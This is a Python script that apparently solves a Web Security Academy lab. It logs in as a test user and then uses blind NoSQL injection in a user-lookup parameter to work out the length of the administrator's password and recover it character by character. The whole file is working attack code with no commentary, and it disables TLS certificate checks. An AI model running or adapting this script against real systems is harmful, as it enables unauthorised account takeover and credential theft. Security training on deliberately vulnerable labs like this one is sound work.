#!/usr/bin/env python

from bs4 import BeautifulSoup
import httpx
import string
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PasswordCracker:
    def __init__(self, base_url):
        self.base_url = base_url
        self.client = httpx.Client(verify=False)
    
    def login(self, username, password):
        resp = self.client.get(self.base_url + "/login")
        bs = BeautifulSoup(resp.text, 'html.parser')
        csrf_token = bs.find("input")['value']
        data = {"username": username, "password": password, "csrf": csrf_token}
        self.client.post(self.base_url + "/login", data=data)

    def find_password_length(self, endpoint):
        full_url = self.base_url + endpoint
        for i in range(1, 100):
            payload = f"administrator' && this.password.length > {i} || 'a'=='b"
            full_url_with_payload = full_url + urllib.parse.quote(payload)
            resp = self.client.get(full_url_with_payload)
            if "message" in resp.text:
                return i
        return None
    
    def extract_admin_password(self, endpoint, length):
        chars = string.ascii_lowercase
        password = ""
        full_url = self.base_url + endpoint
        for i in range(length):
            for c in chars:
                payload = f"administrator' && this.password[{i}] == '{c}' || 'a'=='b"
                full_url_with_payload = full_url + urllib.parse.quote(payload)
                resp = self.client.get(full_url_with_payload)
                if "Could not find user" in resp.text:
                    continue
                else:
                    password += c
                    break
        return password

# Usage
if __name__ == "__main__":
    url = "https://0a7f00f6030061a2817fc0b000c40061.web-security-academy.net"
    cracker = PasswordCracker(url)
    cracker.login("wiener", "peter")
    password_length = cracker.find_password_length("/user/lookup?user=")
    print(f"Password length: {password_length}")
    admin_password = cracker.extract_admin_password("/user/lookup?user=", password_length)
    print(f"Password: {admin_password}")
